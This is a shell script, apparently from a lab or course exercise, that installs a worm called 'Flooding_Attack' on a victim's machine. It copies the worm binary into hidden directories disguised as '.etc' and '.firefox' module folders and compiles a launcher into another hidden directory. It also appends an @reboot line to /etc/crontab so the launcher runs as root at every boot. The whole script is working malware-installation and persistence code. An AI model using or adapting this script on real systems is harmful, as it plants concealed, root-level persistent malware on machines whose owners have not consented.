# This script is to:
# (1) Put the worm binary at the two locations:
#      * /home/victim/.etc/.module/Flooding_Attack
#      * /home/victim/.firefox/.module/Flooding_Attack
# (2) Put the worm checker program at "/home/victim/.Launch_Attack/Launching_Attack"
# (3) Tamper the crontab so that the worm is executed whenever the computer is booted
# 
# Noted that this script does not do any payload.

ldir="/home/victim/.Launch_Attack"
lfname="Launching_Attack"

tamper_crontab() {
    crtbpath="/etc/crontab"
    echo "@reboot root cd $ldir && [ -f $ldir/$lfname ] && ./$lfname" >> $crtbpath &&\
    echo "Corntab \"fixed\"." ||\
    echo "Failed to \"fixed\" crontab."
}

distribute_worm() {
    wormbin="Flooding_Attack"
    dir1="/home/victim/.etc/.module"
    dir2="/home/victim/.firefox/.module"
    mkdir -p $dir1 &&\
    mkdir -p $dir2 &&\
    cp "./$wormbin" "$dir1/$wormbin" &&\
    cp "./$wormbin" "$dir2/$wormbin" &&\
    echo "Worm distributed." ||\
    echo "Failed to distrivute the worm."
}

distribute_worm_launcher(){
    g++ -o "$ldir/$lfname" worm_launcher.cpp &&\
    echo "Worm launcher distributed." ||\
    echo "Failed to distribute worm launcher"
}

distribute_worm_launcher
distribute_worm
tamper_crontab